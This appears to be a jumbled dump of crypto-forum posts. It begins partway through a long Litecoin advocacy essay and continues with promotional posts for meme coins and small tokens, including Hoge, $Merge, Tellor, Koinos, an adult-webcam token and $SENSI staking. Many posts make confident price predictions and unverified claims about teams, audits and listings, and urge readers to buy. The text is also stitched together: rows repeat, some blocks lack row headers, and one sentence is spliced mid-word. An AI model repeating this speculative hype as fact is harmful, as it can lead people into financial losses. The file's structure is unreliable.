The block wars of 2017 are instructive in how this all works.  Big blockers did everything they could to stop segwit from activating, and heavily delayed it long after everyone capable of understanding the tech (even its detractors) realized it was perfectly safe and useful.  In early 2017, Charlie Lee stepped up and said Litecoin would activate it first, plow the road to prove it up.  Along the way alongside bitcoin allies, the Litecoin community helped develop the winning strategy that got bitcoin through activation later that year, the UASF.  Litecoin didn't used the UASF, but the billionaire mining consortium that was blocking progress didn't fold until Charlie came out publicly in favor of it, and that folding told everyone everything they needed to know about how to defeat the big blockers.  

After activation, Charlie put $1 million of his own money into a segwit address and dared big blockers to steal it.  Old timers might understand why, but if you've come around more recently, that fud at that time coming from people who 100% knew it wasn't true, was that any value stored in a segwit address could be stolen, it wasn't safe.  This helped paralyze the market and prevent activation.  Once Charlie put the million dollar segwit bounty up and it went untouched, the fud died so hard that most now don't even remember it was a thing.  More about Charlie later, but this is the moment he earned most of his enemies, and just as they lied viciously to stop lightning adoption then, they lied viciously about him to get revenge after he was so instrumental in helping Bitcoin through that civil war.  

Of, course, the Litecoin community wasn't being purely selfless by adopting segwit and lightning, something that people then and even many still today fear would obviate the need for faster cheaper altcoins.  Litecoin has understood very early on that the most impressive feature of lightning was not fast cheap offchain transactions, but cross chain transactions.  When I said Bitcoin would use Litecoin even more in the future than in the past, this is what I meant.  

**In the future I believe Bitcoin and Litecoin will flow seamlessly and constantly across the lightning network and mutually reinforce each other's security.  I believe coffee is not an endgame for lightning, it's just how to get the liquidity kickstarted.  In the future I believe the entire world will touch lightning every day, most without realizing it, and that layer will be their most frequent interaction with the underlying networks.  In that scenario, in order to attack the lightning backbone and either take it down or spam it, you'd have to simultaneously take on both the underlying bitcoin and Litecoin networks, thus mutual reinforcement.  If only one fails, traffic can temporarily divert final settlement to the other chain until the downed chain returns.  The cost of such an attack, both in dollars and logistical complications will further discourage any attack from ever taking place.**  

Yes, Bitcoin is the most important user of Litecoin.  In the early days people often used Litecoin as a quick arbitrage coin to move value between exchanges and save fees.  This was but a shadow of things to come.  Combined with Litecoin's other redeeming qualities discussed in several questions above, it's closeness to bitcoin in code and culture have made it silver to bitcoin's gold in more ways than most will ever acknowledge.  But in addition to some market based behaviours that are similar between silver and gold such as price oscillation, remember that Litecoin is also robin to bitcoin's batman, Daniel-san to Bitcoin's Miyagi, Pippen to Bitcoin's Jordan and a wink to Bitcoin's smile.  Litecoin has outlasted untold bitcoin killers precisely because it never even tried to compete with bitcoin, but to help it, and in the process it has carved out its own lane to dominate and thrive with a little help from its most important user, Bitcoin.  

As a result of this longstanding and growing affiliation, software and infrastructure that is quick to add bitcoin is usually pretty quick to add Litecoin.  And then users who are friendly to bitcoin are more friendly to Litecoin, ensuring enough volume and liquidity to maintain that infrastructure over time.  

**Q.** If Charlie dumped all his Litecoins, why would I want to hold them?  
**A.** Often the implication of people who drop in to say the founder of Litecoin dumped his coins want to leave you with the impression that he left the project without actually having to lie and say that.  He not only didn't leave, he's been more active and more successful at helping Litecoin build adoption and infrastructure than he was before he divested.  

He still uses Litecoin at every opportunity, including to make purchases to donate to Litecoin development.  In the recent multiyear MWEB development rollout, funded entirely by community donations, Charlie personally matched every donation made.  He's donated to other causes as well for both adoption and development and is almost certainly the largest donor so far, though other large donors like Ryan Wright are starting to step up as well.  

Charlie was being harassed before he divested with every Litecoin news item he posted accusing him of pumping and dumping on hype.  Tons of founders and ICO scam artists were doing exactly that at the time, and Charlie figured that by divesting, he could assure everyone that his efforts and posts were to build Litecoin up rather than trying to profit off pumps and dumps.  He underestimated the trolls, mostly big blockers back then, who then made his divestment their new favorite talking point, trying to make people think he'd abandoned the project.  

But in the course of divesting I think mostly for that reason, he accomplished something far more important that I alluded to in an earlier question.  Litecoin now has no founder's stash, an element of decentralization that sets it apart from even the king of decentralization, Bitcoin.  In many ways, Charlie has mirrored what Satoshi did when he actually stepped away from the project, abandoning bitcoin.  Satoshi left and kept his coins.  Charlie stayed and divested.  

I would imagine in the end both bitcoin and Litecoin will end up equal on these fronts, that eventually Charlie will move on, as a coin founder of a decentralized, public blockchain should, and that Satoshi's coins will be circulated as well, so neither will have either a founder's stash nor an active founder leading the community.  For now, whatever his motivation, I find Litecoin more appealing for its lack of a founder's stash.  

**Q.**  So you think Charlie is a saint or something?  
**A.**  Nah, he's a pretty normal, chill dude.  As human as anyone, just trying to figure things out as he goes.  Not unlike Satoshi.  I think Charlie's instincts are far more appropriate to a truly decentralized space than most coin founder who do act like CEOs even though they claim to control a decentralized blockchain rather than a centralized security/company.  

I think it would surprise most to hear that Charlie has said repeatedly he made more money out of bitcoin than Litecoin.  It shouldn't be a surprise to anyone.  He founded Litecoin in 2011, just two years after bitcoin launched, and he was obviously into bitcoin before that.  He had a similar experience to many of us, bought some when people were talking about, and it went down after, but for anyone who got in then and stayed, I mean of course he made a fortune on bitcoin.  And since Litecoin was fairly launched and he was just one miner alongside everyone else who at the time was eager for a coin to mine with lesser hardware than bitcoin by then required, his stash was never the size of Satoshi's, much less of these huge premined, ICO'd, centralized coin launches that are more common today.  

I especially think the hate around him is based on transparent lies.  Don't believe me, DYOR.  Step past the trolls for a bit and get to know him yourself.  He's soft-spoken, the worst hype-master ever (my highest compliment for anyone), nice, and a constant advocate for bitcoin as well as Litecoin, something very in sync with the Litecoin community as a whole.  We're all Bitcoiners in addition to being Litecoiners.  

**Q.** Doesn't Litecoin's success just comes from it being old?  
**A.** Many old coins died out.  Litecoin isn't even the oldest, it's just the oldest that has thrived.  It thrived for many of the reasons that have already been laid out.  The high marks on decentralization helped, the close, affectionate relationship with bitcoin helped, the low fees combined with deep and broad security helped, and yes, time helped too.  

But it's not ""just"" old.  **Litecoin got old and outlived so many failed projects because it made so many right choices along the way.**  

**Q.** If Litecoin is so great, why is the price so low?  
**A.** Ah, yes, well, fundamentals are…fun, but of course price matters.  Litecoin wouldn't be deep clucking value if there weren't appreciation in its future.  

That's the first thing you have to think about here.  Do you want to hop on board a project that already has most of its price appreciation in the past, or one that still has most of it's price appreciation ahead of it.  Trend following does pay off for some people, but probably not as many as you think.  I've seen trend followers lose money in every kind of market.  Even in raging bull markets they fomo in at the top, panic sell the bottom of the next move, then buy back in even higher than first time, multiplying losses over time.  And even if a trend follower gets in before the end of crypto's often accelerated trends, they are often more quiet about how much they lose on the trends that end right when the jump in.  

**Litecoin is an amazing trading coin precisely because it has predictability.**  You don't have to wonder whether it's cheap or expensive, it has the most established ratio price history of any coin against bitcoin, and for that matter, the most usefully established history against eth as well.  Both ratios are extremely useful trading pairs (even if you to do a multihop trade on an exchange that doesn't have the pair directly) against Litecoin.  

Since this is a proDYOR post, I'm not going to tell you where the cheap ratios and expensive ratios are.  But the good news is, it's really, really easy to find on the chart.  The trend followers would look at a ltcbtc or ltceth chart and jump on anything but ltc.  A deep value investor will zoom out and look at what happened when litecoin was in a similar position in previous cycles.  

**Q.** C'mon.  BTC has exceeded 3x its 2017 ATH, ETH has done similar.  You have to admit LTC has failed is now going to fade to nothing.  
**A.** Litecoin's lagging price is a feature, not a bug, and it's not new.  Litecoin tends to price in progress all at once.  The benefit of that is that you have much longer, cheaper accumulation periods than with coins that price in more gradually where each buy is more expensive than the last.  

Here's the fiat price pattern to look for.  Litecoin leads all coins, even bitcoin, out of crypto winter.  It did 7x in 2015, 6x in 2019 (probably could've gotten higher but Novogratz bandwagoned a short campaign against it as it led the recovery rally, he failed and I wouldn't be surprised if he lost money on the bounce, but did put a little dent in highs).  Then Litecoin hibernates around 18 months while other coins take off in succession, first bitcoin, then eth, then lots of others.  In spring of 2017 and spring of 2021, Litecoin was off to the races in almost a perfect reflection of past price action, and most of you know what happened next.  Maypocolypse affected some coins more than others, those that finished a rally well above their old ATHs before that date fared much better than those that were just cycling up for their run.  

Had maypocolypse happened in august instead, Litecoin likely would have reached $1000 before crashing back down to $400 or so, just as in 2017 it reached $100 before crashing back around the old 2013 high, and then set up for another year end rally to finish off in fine fashion.  

Now you can look at that maypocolypse price action and find your bias confirmed if you please.  But I think the more clever and studious will see an even more extended opportunity to buy Litecoin cheap than exists in even a standard cycle.  Bouyed by fundamentals and with long term price action far more visible than on newer, flimsier projects, Litecoin shows a base of epic proportions.  

Those of us who've had success trading litecoin have used it as an oscillator.  When Litecoin is strong against bitcoin or eth, as it was dominating them in 2019, that's a good time to use your Litecoin to buy bitcoin or eth.  When Litecoin is weak against them, as it is now, it's a great time to use eth and btc to buy Litecoin.  Look at the charts yourself.  It's a killer trade with incredible intelligence about what ""strong"" and ""weak"" mean buried everywhere in the long term price action.  

Anyone ever hear the phrase, ""the longer the base, the higher in space?""  We're about to find out if it's true.  I can't think of a better test case than Litecoin given all the substance it has under the surface.  This is the ultimate all cattle, no hat crypto, and even if all you want to do is check and see if substance matters, if hype is the only thing real in crypto as the nocoiners believe, watch Litecoin.  It's the proof in the pudding.  Deep Clucking Value.  

**Q.**  Why is the value… clucking?  Are you having a stroke?  
**A. The longtime mascot of Litecoin is the Chicken**, normally spelled chikun for the normal memey reasons.  The chikun is the mainstay of litecoin gifs and posts.  I've been known to respond to fudsters with a hearty ""yipeekiyay mothercluckers"", myself.  That one hasn't really taken off, but I'm trying to get it going.  

**Q.** TL;DR?  
**A. Litecoin is Deep Clucking Value.**",0,2021-12-17 13:05:17,40

DOGE,Altcoin,"I don't believe that every opportunity is a rip-off; in fact, some of them have the potential to make you quite wealthy.","Many crypto fans have been opposed to investing in meme currencies since they first surfaced in the crypto realm. Analysts cautioned that investing in meme tokens is not always a safe bet. Many people, I was informed, would bet on these coins in the hopes of choosing the next Doge or Shiba, and many of them would be burned. That may be true, but there are more opportunities to invest in and get wealthy now than there have ever been.

They demonstrated last year that there was plenty of opportunity for expansion. 

  
Industry representatives stressed the importance of caution when choosing which tokens to invest in and avoiding scams such as ""rug pulls,"" which refers to scenarios in which developers abandon a project and walk away with investors' funds.

DOGE,Altcoin,Meme coins can make you huge ROI if you perform a little social research,"Meme coins were not established with a specific use or inherent value in mind, whereas mainstream cryptocurrencies, like as Bitcoin, were designed with specific technology to ease trading and transactions in the cryptocurrency market. ""With meme currencies, there are no fundamentals."" They're more of a community-driven phenomenon, a sort of millennial and Gen Z expression. If you will, it has all the trappings of reckless gambling. Investing in meme currencies has its own set of advantages and disadvantages. This is seen by the recent rise and fall of the Squid Games token.  
In cryptocurrency, volatility is always a risk, and meme coins are considerably more volatile than other crypto assets. Meme currencies are heavily influenced by the community. Influencers' fame and success are largely due to the support and publicity they receive on social media. Mononoke Inu, for example, is a token that had a significant price increase just two days ago. Its price increased by 100 percent in just 24 hours! Elon Musk, the wealthy CEO of SpaceX and Tesla, for example, tweets about cryptocurrencies on a regular basis, which appears to have influenced their value.

DOGE,Altcoin,"Meme-Crypto Wars: Dogecoin and SHIB Prices Falter, Cake Monster Jumps Over 800% in 7 Days"," 

[https://news.bitcoin.com/meme-crypto-wars-dogecoin-and-shib-prices-falter-cake-monster-jumps-over-800-in-7-days/](https://news.bitcoin.com/meme-crypto-wars-dogecoin-and-shib-prices-falter-cake-monster-jumps-over-800-in-7-days/)

**In 2021, meme-based crypto assets skyrocketed in value following the lead of the original meme crypto-asset dogecoin’s massive gains. This week a great number of digital currencies have rebounded in price but a slew of popular meme tokens are not doing so hot this week. However, one specific meme-crypto called “cake monster” has jumped 112% in value during the last 24 hours.**

# Dogecoin and Shiba Inu Markets Have Seen Better Days

Bitcoin.com has covered a wide variety of meme-based cryptocurrencies that followed the ‘Dogefather’s’ 8,818% one-year gains. [Dogecoin (DOGE)](https://markets.bitcoin.com/crypto/DOGE) has seen a triumphant rise in 2021 thanks to mainstream media coverage and shoutouts from the Tesla CEO Elon Musk.

[DOGE](https://markets.bitcoin.com/crypto/DOGE) has gained 36.5% during the last month, but dogecoin is down 13% over the course of the week. At the time of writing, a single DOGE is swapping for $0.284508 per unit.

Another meme-asset that took the crypto world by storm is [shiba inu (SHIB)](https://www.coingecko.com/en/coins/shiba-inu) as it has outpaced dogecoin’s gains gathering a whopping 8,750,740% in less than 12 months.

But just like [DOGE](https://markets.bitcoin.com/crypto/DOGE), SHIB is down 14.8% during the last seven days. SHIB has only gained 16.6% during the last 30 days and at the time of writing a single SHIB exchanges hands for $0.00000721 per token.

# Cake Monster Performance Outshines All the Meme Token Markets

Those two crypto assets are the largest meme-based cryptos in terms of market capitalization as DOGE has a $37 billion market valuation and SHIB has a ​​$3.5 billion capitalization.

This is followed by monacoin ($129M), hoge finance ($74M), yooshi ($60M), cumrocket ($58M), cake monster ($32M), and dogelon mars ($31M). The crypto-token [cake monster (MONSTA)](https://cake.monster/) has been the largest gainer out of all the meme assets in terms of gains.

MONSTA has jumped a whopping [844%](https://www.coingecko.com/en/coins/cake-monster) in seven days and 1,550% over the last two weeks. 30 day stats show cake monster (MONSTA) is up 1,295% during the last month. The Cake Monster team says that the defi protocol is the first to leverage [Gravity Vaults](https://docs.cake.monster/).

Cake is deflationary and transaction fees are continuously added to the Gravity Vault. Furthermore, when the Gravity Vault taps 1 million MONSTA, holders can claim their coins from the defi vault. A single MONSTA is swapping for $0.00538036 per unit at press time.nd kawakami inu (KAWA) is down 47% over the last seven days.",24,2021-08-29 06:41:32,23
DOGE,Altcoin,Meme coins can make you huge ROI if you perform a little social research,"Meme coins were not established with a specific use or inherent value in mind, whereas mainstream cryptocurrencies, like as Bitcoin, were designed with specific technology to ease trading and transactions in the cryptocurrency market. ""With meme currencies, there are no fundamentals."" They're more of a community-driven phenomenon, a sort of millennial and Gen Z expression. If you will, it has all the trappings of reckless gambling. Investing in meme currencies has its own set of advantages and disadvantages. This is seen by the recent rise and fall of the Squid Games token.  
In cryptocurrency, volatility is always a risk, and meme coins are considerably more volatile than other crypto assets. Meme currencies are heavily influenced by the community. Influencers' fame and success are largely due to the support and publicity they receive on social media. Mononoke Inu, for example, is a token that had a significant price increase just two days ago. Its price increased by 100 percent in just 24 hours! Elon Musk, the wealthy CEO of SpaceX and Tesla, for example, tweets about cryptocurrencies on a regular basis, which appears to have influenced their value.

There is no token yet but the ticker is $REBL [https://coinmarketcap.com/currencies/rebl/](https://coinmarketcap.com/currencies/rebl/) , I'm sure a lot of projects will get into nft treasure hunting in the future so it's important to mention that tech is being developed in that area. reBASE is the first.

Part 1) An augmented reality app that brings NFTs from behind the screen to real life. This enables IRL Geo-Based NFT treasure hunts and creates a new narrative to follow called #Find2Earn or #Hunt2Earn. These Geo based NFTs allow reBASE to select event locations that are likely to produce large crowds in both spaces. NFTs minted at these events are associated with unique geo-metadata which can add some exclusivity to the nfts and increase the value.

Part 2) The metaverse - The app mentioned above is connected to their metaverse which is also bringing new tech to crypto. This Metaverse will be the first social metaverse mimicking the real world using Dymaxion Projection. This means the metaverse lands will mimic real world locations. Anything you build or buy in the metaverse or any NFT you own can be viewed in the world using the AR app.

Find2earn might catch on like Move2Earn did so if you want to follow rebase check out their medium [https://rebasegg.medium.com/](https://rebasegg.medium.com/) and new website [https://rebase.gg/](https://rebase.gg/)

r/Koinos

https://coinmarketcap.com/nl/currencies/koinos/

Our mission is to empower people through ownership of their digital selves and blockchain is the most promising technology for accomplishing this mission. Blockchain-based applications can add value to people’s lives in an infinite variety of ways but building such applications is far too difficult, time consuming, and expensive.
In order to accomplish our mission we need to dramatically expand the quantity of blockchain powered applications in existence, and the number of people capable of using those applications, which is why we are building a brand new blockchain from the ground up to make it fast, easy, and affordable to build blockchain-based applications that are capable of delighting users.

The Blockchain
When it launches the Koinos mainnet will be a fast and fee-less blockchain that enables developers to create an unlimited number of free accounts for their users. Koinos won’t just lower the barriers to entry, it will obliterate them and open up blockchain applications to an order of magnitude more users.
At OpenOrchard we are developer obsessed which is why Koinos will enable developers to use the programming languages they already know and love thanks to WASM integration. Koinos will start with C++ support, followed soon after by typescript, and then whatever programming languages developers want most like .net and Go.
Thanks to these features, Koinos will deliver an unparalleled experience to both developers and their users, but that won’t launch for another 6 months, so what have we been doing up until now?

The Framework
We have built a brand new, high performance, vertically scalable, blockchain framework which can acquire any feature through smart contract modules running in the virtual machine. Because these smart contracts can be upgraded in-band, any behavior can be added to the blockchain without requiring a hardfork. This unlocks a new capability we call “modular upgradeability” which resolves one of the biggest challenges facing existing blockchains; how difficult they are to upgrade.

Modular Upgradeability
Modular upgradeability enables us to rapidly add different features to the framework without impacting any other part of the blockchain. This is how we will be able to offer a testnet in just 3 months that delivers Ethereum feature parity, but with WASM smart contracts, fast block times, and fee-less transactions. While the testnet will feature proof of work, the Koinos blockchain framework makes it easy for us to swap that consensus algorithm out for the totally new and different algorithm that we’re developing for mainnet.
Thanks to modular upgradeability, individual upgrades can be pushed to the network much like an operating system patch but with an on-chain record of the entire path that the upgrade took. Instead of having to package critical upgrades into time consuming, political, and risky hardforks, individual fixes can be pushed to the network the moment they are ready enabling Koinos to rapidly improve itself. It is that capability that we believe makes Koinos the first blockchain in history capable of evolving.

Scalability
After upgradeability, the next major challenge facing existing blockchains is scalability. Blockchains hold on to every transaction and smart contract that has ever been added to them, regardless of whether they get used or not. That means that the cost of lugging around all of this expensive data gets baked into the cost of every new transaction which itself adds even more information to the chain. All of this old and unused data is responsible for the vast majority of the cost of running a blockchain. But what if we could remove all of that data, while retaining the ability to bring it back to life as if it had never left like MAGIC?

State-Paging
Well we have figured out how to do exactly that. We call it state-paging and Koinos will be the first blockchain ever to have it. Not only is this a genuine innovation that could be THE key to scaling blockchain to the masses, but existing blockchains like EOS and Ethereum cannot take advantage of this capability without totally rearchitecting their entire blockchain.
I saved state-paging for last because it is both highly innovative and highly experimental. All of the algorithms have been written and tested. We know we can page data out and back in without any loss in trustlessnes. State-paging works. What we’re not 100% sure about, is how much the memory savings will outweigh additional bandwidth consumption. But that’s mainly because we don’t know how people will use Koinos. In our tests we found that were state paging a part of existing blockchains, state size could be decreased by as much as 78% and that number would only increase as the blockchain got older. If we see similar numbers on Koinos, then state-paging will be a game-changer.
It’s just very important to us that we be upfront about what we have already developed, what we know we can develop but haven’t yet, and what we just don’t know yet. What we believe very much, is that Koinos will be our best attempt to resolve the major issues holding back blockchain adoption and denying people the empowerment that will come from digital self ownership. If this sounds like something that you want to be a part of, then we invite you to join us by firing up those miners.
Lastly, we really want to make sure that you receive important information about Koinos like how to claim your tokens when mainnet launches, so please join our mailing list by going to koinos or openorchard.

Upper bounds
At most 100,000,000 KOIN will be minted during the ERC20 phase.
After the airdrop on the Koinos blockchain mainnet, the Koinos blockchain will mint KOIN tokens at a rate of up to 15% per year.
Therefore, it is quite possible that up to 115,000,000 KOIN may exist one year after the launch of the Koinos mainnet.
There is no specific long-term upper bound on the amount of KOIN that will ever exist.
Importantly, Koinos's extreme upgradeability adds some degree of uncertainty to any discussion of the system's future trajectory:
The Koinos blockchain's governance system will be able to upgrade any part of the system.
We recommend that governance system participants should not ratify any upgrade that results in more than 15% per year minting.
However, it is possible that governance participants will not follow this recommendation.
This means it is theoretically possible KOIN tokens may be printed in excess of the 15% per year limit if such changes are approved by governance.

It’s just as the name suggests. Your favourite amateur stars on webcam hosted by $CUMINU. Models will be booked and tipped in $CUMINU tokens. $CUMINU will charge a 10% transaction fee.

Content
Models will be able to host a profile on $CUMINU that has a range of unlockable content. These will include photos and videos, private message requests and even NFTs.

Ama's
Plans to host fortnightly AMA (ask me anything) with the biggest names in the industry. The sessions will have tiered membership determined by number of $CUMINU in the holder’s wallet. Viewers will be able to purchase $CUMNIU before the AMA and tip the model throughout the session.

Tokenomics / Burn
They are going to charge 10% on all transactions through the site. Then use those funds to buy back the $CUMINU and burn them. This makes the token deflationary. OnlyFans isn't for all the degens as you have to give ID and hand over your credit card details. Being able to visit these sites and tip in crypto will be a big win. They’re going to auction NFT's of the models during the AMAs. There are some crazy fans out there.

DOGE,Altcoin,"I don't believe that every opportunity is a rip-off; in fact, some of them have the potential to make you quite wealthy.","Many crypto fans have been opposed to investing in meme currencies since they first surfaced in the crypto realm. Analysts cautioned that investing in meme tokens is not always a safe bet. Many people, I was informed, would bet on these coins in the hopes of choosing the next Doge or Shiba, and many of them would be burned. That may be true, but there are more opportunities to invest in and get wealthy now than there have ever been. You may make money by investing in the stock market, real estate, or cryptocurrencies, but in 2021, the most interesting alternative was to invest in Shiba Inu, Doge, or [Mononoke Inu](https://coinmarketcap.com/currencies/mononoke-inu/) meme coins. They demonstrated last year that there was plenty of opportunity for expansion. 

  
Industry representatives stressed the importance of caution when choosing which tokens to invest in and avoiding scams such as ""rug pulls,"" which refers to scenarios in which developers abandon a project and walk away with investors' funds. Finding the right meme currency to invest in is getting harder, but the more the risk, the larger the potential reward. What are your opinions on this, and do you plan to invest in a meme currency in 2022?",0,2022-01-26 20:31:18,13
DOGE,Altcoin,"It's difficult to ride the excitement wave without collapsing at least once, I've discovered. And that's perfectly acceptable.","Speculators that invest in meme coins in the hopes of making a profit are essentially betting on the meme coin's continued popularity. Those who purchase at higher prices bank on the product's continuing appeal as its popularity grows and prices climb. When the worth of funny coins skyrocketed, people made millions. On the other hand, those who got on the bandwagon immediately before it collapsed lost money.   
 

Rather than betting in Doge and ShibaINU coins, whose prices have already skyrocketed and their hype wave has passed, we should look for new meme currencies that could be the next big thing.   
 

In my spare time, I look into meme currencies to see if any are worthwhile investments. I learnt how to ""surf"" on a hype wave. For example, I've observed how [StrongINU](https://coinmarketcap.com/currencies/strong-inu/)has flourished in these changing flows in my own experience.   
 

It's possible that the price has reduced, but investments work in this way. The greater the risk, the greater the potential return.   
 

A good joke is something that almost everyone enjoys. Are investors, on the other hand, becoming the punchline when it comes to meme coin?",12,2022-02-07 18:39:22,11

DOGE,Altcoin,Take a Look At Hoge. Here’s a real breakdown of the project. 🌙,"Why you want to take another look at Hoge,

I know, you think Hoge is a shi/tcoin. You probably think the bubble has burst. 

**Let me tell you why you are wrong**

Hoge is the 2nd fastest growing coin on the Eth chain in history. It is here to stay. 

**Hoge is more than a crypto. Here’s Four reasons why. I’ll keep it short and sweet.**

**Reason One:**
Hoge is now an established legal entity in France. This means that Hoge is here to stay with doxxed developers. Furthermore, Hoge is now trademarked and protected on a marketing front. Not to mention the sky net security score or 96 AND the Audit by Certik that should be finalized on Friday 4/16- along with the BigONE listing. 

**Reason Two:**
The developers are constantly communicating and being transparent to the community. They have been busy at work over the last few months and have not shown any signs of giving up. There have been numerous developments that have been released including their promises to work on new exchanges.

**Reason three:**
Exchanges. Hoge will be listed on BigONE on Friday, 4/16. This is a huge exchange and will certainly bring massive amounts of volume into HOGE. In the future of 2021 Q2, the U.S market plans to be targeted. We have secured billboards across Las Vegas and are planning to market and work with a US based exchange to offer a one tap buy for HOGE. 

**Reason Four:**
Do you have animals? Do you like animals? If yes to either, introduce HOGE. The only audited legal team that has actually given to charity. Hell, there is even a forum on the official hoge website to guide shelters step by step into creating a charity wallet. The fact is, HOGE is the only crypto out right now that is legally giving funds to help a good cause. If you like anything to do with animals, Hoge is your coin. 

**FAQ**

Why would I invest in HOGE?
I’m not saying to invest... but the TA charts are looking extremely bullish and volume is picking up considerably. With the addition of BIGONE I think Hoge will find a huge jump. 

What are the next developments?
There is a full roadmap on the website. For short term though, marketing in the US will ramp up and talks with US based exchanges will commence following that. 

What else?
Hoge game labs is starting to form exponentially fast. Hoge has formed an e-sports team and begun developing a Dapp based gaming system. 

“It’s JuSt a MeMe CoIn”:
Fantastic, and so is doge. Explain to me why doge is now the 10th largest crypto? Use case for HOGE is already here from their gaming perspective to the animal charity support. Enough with the FUD, the age of Altcoin is upon us. Jump on or get left in the dust.

DOGE,Altcoin,Why do I believe in $Merge?,"Short answer is because @donjuliozz is very persuasive. The longer and more accurate answer is that Don was convincing enough for me to take a look into the project myself and I have to agree that the project has some serious legs, 

@theprojectmerge started in 2017 which means if it was a rug pull / ponsi it would have disappeared by now, also the team has constantly been updating and upgrading the project in this time which dismissed my fears that it may be a con,

Next point is the token itself actually has a use unlike the thousands of doge runoffs being pumped out. The main use at the moment apart from investing and waiting for the inevitable growth is to increase your available uses on the @rocketbotpro tipping and giveaway bot, the great thing about this is it doesn't actually cost you any tokens to increase your uses, you just need to have them in your wallet so if you ever decide against the platform you can just sell up and it really didn't cost you anything, in fact you probably will have gained from the coins going up in value while you were using the platform.

Why use @rocketbotpro instead of the other available tipping bots? 
Because it's so simple to use, it runs across Discord, Twitter and telegram at the moment with a view for it to be released on insta and facebook in the near future and the codes to trigger the bot are quite self explanatory unlike the other options, 

The only downside to @rocketbot is its current lack of coins, because it was created in the dark ages of Crypto it is limited to BTC chain coins at the moment but this is due to change in literally the next few days if not weeks because of the soon to update bridge to the BSC and ETH networks, how the bridge actually works is far too complicated for me to try and explain but the end result will be that almost any coin or token should be able to use the rocketbot on the social media platforms to distribute without paying fees which is a huge marketing advantage when you want to get your coin into more hands.

When this happens more people will need to hold some $Merge if they want to use the bot a lot 
(it does have free uses but for promotion you will need to hold at least some, not spend, just hold) 
that will drive the demand for and price of $Merge up and then everyone wins.

And that's why I chose to support $Merge

DOGE,Altcoin,Best low cap low supply coin on Coinbase,"Tellor (TRB) has a circulating supply of only 2 million and a marketcap of 130 million and it is currently trading at $64. Tellor is listed on Coinbase and has an ATH of $169. I believe with TRB having such a low supply and being listed on one of the largest exchanges in the world it has the potential to explode in value as investors start looking for coins with the most room to grow. In my opinion TRB is undervalued at the moment and the only big problem I have seen with it is it has just had a lack of attention from investors but once people find out about Tellor I think it will raise in value extremely fast. I believe Tellor will be worth $1000+ in the near future as this bullrun continues especially after coins like shib and doge have been in the news so much this year with stories of people making ridiculous amounts of money off of them people will look for coins that can grow quickly and Tellor is one of the best I’ve found with a low supply and a low marketcap it can pick up traction very quickly as people begin to buy it. Not finical advise I was just surprised to find a low cap low supply coin like this listed on coinbase I figured something had to be wrong with it but after researching the project I really liked it, it just hasn’t gotten the publicity other coins have gotten yet.

DOGE,Altcoin,"Dogecoin up 30% this week, expect more increase before Wednesday next week"," 

Dogecoin  is expected to be a huge buy over the weekend.  Currently trading  around 0.003100 range.  Asia was able to boost the coin to almost 3200  range (will not put additional 0 in front from here on out).

​

It  is possible and maybe even realistic that Dogecoin can see a high as  far up as 2800 by the time the weekend starts.  Leading myself to  predict a price of 4000 (0.004) is the price to see before the September  5th promotion of the Doge-ETH bridge; which I must inform is an Alpha  stage.

This is the #SENSIREVOLUTION. 

Sensible.Finance’s token, $SENSI, has recently been listed on one of the 10 top CEXs in the world - Digifinex.com! With over a 100 cryptocurrencies, and being one of the leaders in liquidity and volume, Digifinex has brought us exposure to over 4 million trusted users that sees potential in $SENSI.

In addition, the team has doxxed on their website! You may see part of the team’s Linkedin profiles, with their CEO having an impressive background, having come from both Google and Microsoft!

The community’s trust has been steadily growing over the past weeks, as we’ve had the team dox, 2 AMAs, AND a Wes Spencer video! For the uninitiated, Wes Spencer a Crypto Youtuber that does not simply promote ANY project that he is paid to… He believes in each of the projects that he chooses to promote, as his reputation is clearly on the line.

To have Wes promote $SENSI is a great step forward in gaining more trust from the community, as well as from new investors!

Having completed our AMAs over the past week, $SENSI investors now have a clearer idea of what is to come next, with various goodies available for investors to pick out! These include:
 1. The availability of $SENSI Locking to all investors,
 2. Hints to marketing pushes,
 3. Forms of utility that the team is planning to add, such as rug checkers/contract checkers to prevent scams from happening to you guys!
 4. Listings on other CEXs,
 5. The release of Alpha Testing to investors who have signed up!
 6. Ability to farm SENSI-BNB LPs on a low-risk farm!

If you already cannot wait, join us at our Telegram - https://t.me/sensiblefinance, and check out the transcripts for the 2 AMAs (in the pinned messages)!

Now if that isn’t enough for you to look forward to, just keep a look out for Smart Staking! Why?
Smart Staking is essentially the equivalent of an ETF, in the crypto space. And what does that mean for Smart Stakers, and $SENSI Holders? What is the difference between Smart Staking and $SENSI Locking?

Smart Staking
Smart Staking will require BNB as input for a set, fixed term stake. The BNB will be used to stake in 10-15 different, pre-audited and whitelisted high-yield farms, each day. The rewards and initial deposit will only be able to be collected AFTER the stipulated term is over. Smart Staking is inherently riskier than $SENSI Locking due to the fact that they are sent out to yield farms. However, the risk is compensated for through the diversification of the type of farms that the BNB is distributed to. What this means, is that if one farm makes a loss on any given day, the gains from the other farms will be able to mitigate the losses.

Rewards will be paid out to Smart Stakers in $SENSI, of which a certain percentage will be reflected to the dynamic reward pool for $SENSI Locking.

$SENSI Locking
$SENSI Locking is a steady, deflationary rewards program for $SENSI holders. Holders will be able to lock their tokens and be rewarded a percentage of the dynamic rewards pool (to be explained later), that is distributed to all $SENSI lockers daily. Lockers will be able to benefit from the inbuilt 4% token burn. The rewards will be paid out in $SENSI.

So what do we mean by a Dynamic Reward Pool for $SENSI Locking?
You see, we can’t afford for our Reward Pool to be depleted, right? So what we’ve done, was to promise a percentage of the reward pool to all $SENSI Lockers. The percentage is NOT fixed - it is dynamic and changes from day to day, depending on the reflected yield from Smart Staking - we expect this to be around 0.35 to 6% of the reward pool. This percentage of the reward pool will be distributed to all $SENSI Lockers by the amount that they have locked. For example, if a total of 10 tokens were Locked, and you locked 1 token, you will receive 10% of the percentage of the dynamic reward pool that is paid out at the end of the day, i.e., if the pool has 1000 tokens and pays out 1% that day, you will receive (1% x 1000 x 10%) = 1 token as your reward for the day.

And why is this beneficial to all holders?
 7. Since all the rewards are paid out in $SENSI, anyone who participates in Smart Staking are essentially paying for $SENSI.
 8. With the in-built burn mechanism AND a reflection of Smart Staking yield into the dynamic reward pool, $SENSI holders are automatically rewarded, AND this ensures a healthy and continuous buy order of $SENSI.
 9. Smart Stakers don’t miss out, either. With a higher expected return due to the lowered amount of risk incurred through Smart Staking, it essentially ensures a much more acceptable reward-to-risk ratio. AND you get paid in $SENSI, which grows with every transaction.

If this doesn’t get you thinking about how to make your money work for you in Crypto, what will?
Join us - join the #SENSIREVOLUTION. The onus is on us, to make our money work for us, and $SENSI will pave the way for you.

